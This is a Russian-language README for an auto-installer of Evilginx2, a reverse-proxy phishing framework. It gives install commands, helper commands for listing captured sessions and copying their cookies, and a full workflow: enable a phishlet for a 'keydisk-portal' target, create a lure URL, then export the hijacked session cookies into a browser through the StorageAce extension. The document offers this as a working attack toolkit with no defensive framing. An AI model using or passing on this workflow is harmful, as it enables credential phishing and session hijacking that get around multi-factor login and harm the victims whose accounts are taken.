# 🔥 AKUMA EvilGinx2 AutoInstaller

**Автоматический установщик Evilginx2 с исправлениями для надежного сохранения сессий**

## ⚡ Быстрая установка
```bash
git clone https://github.com/sweetpotatohack/AKUMA-EvilGinx2-AutoInstaller.git
cd AKUMA-EvilGinx2-AutoInstaller
sudo bash install_evilginx2.sh
```

## 🚀 Особенности
- ✅ Исправлена проблема сохранения сессий в базе данных
- ✅ Точный формат cookies для StorageAce extension  
- ✅ Удобные команды для работы с сессиями
- ✅ Автоматическое применение всех исправлений

## 🎯 Основные команды
```bash
evilginx-manager                # Интерактивный менеджер
evilginx-sessions              # Показать все сессии
evilginx-sessions 1            # Детали сессии ID 1
evilginx-copy-cookies 1        # Скопировать cookies для импорта
```

## 🍪 Импорт cookies в браузер
1. Установите StorageAce extension
2. Выполните: `evilginx-copy-cookies 1`  
3. Откройте сайт в браузере
4. StorageAce → Cookies → Import → вставьте JSON

## 🔧 Полный рабочий процесс
```bash
# 1. Установка
sudo bash install_evilginx2.sh

# 2. Запуск
sudo evilginx-manager interactive

# 3. В evilginx2: настройка
phishlets enable keydisk-portal
lures create keydisk-portal
lures get-url 0

# 4. После захвата сессии
evilginx-copy-cookies 1
# Импорт в StorageAce
```

**Теперь сессии надежно сохраняются!**
